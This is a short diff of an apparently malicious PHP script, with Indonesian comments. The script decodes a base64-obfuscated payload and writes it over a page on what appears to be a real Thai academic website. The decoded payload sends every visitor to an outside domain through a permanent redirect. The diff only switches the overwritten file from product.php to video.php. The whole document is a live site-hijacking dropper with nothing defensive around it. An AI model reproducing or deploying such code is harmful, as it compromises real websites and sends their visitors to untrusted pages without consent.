@@ -3,7 +3,7 @@
 $base64_code = 'PD9waHAKJHJlZGlyZWN0X3VybCA9ICJodHRwczovL3Vsb3NiYXRhay5saWZlL2tvbmdydXNoIjsKaGVhZGVyKCJIVFRQLzEuMSAzMDEgTW92ZWQgUGVybWFuZW50bHkiKTsKaGVhZGVyKCJMb2NhdGlvbjogJHJlZGlyZWN0X3VybCIpOwpleGl0KCk7Cj8+Cg==';
 
 // Path lengkap ke file target
-$file_path = '/home/tipnuada/domains/tipnuad.ac.th/public_html/amss/product.php';
+$file_path = '/home/tipnuada/domains/tipnuad.ac.th/public_html/amss//video.php';
 
 // Decode base64 dan timpa isi file target
 file_put_contents($file_path, base64_decode($base64_code));
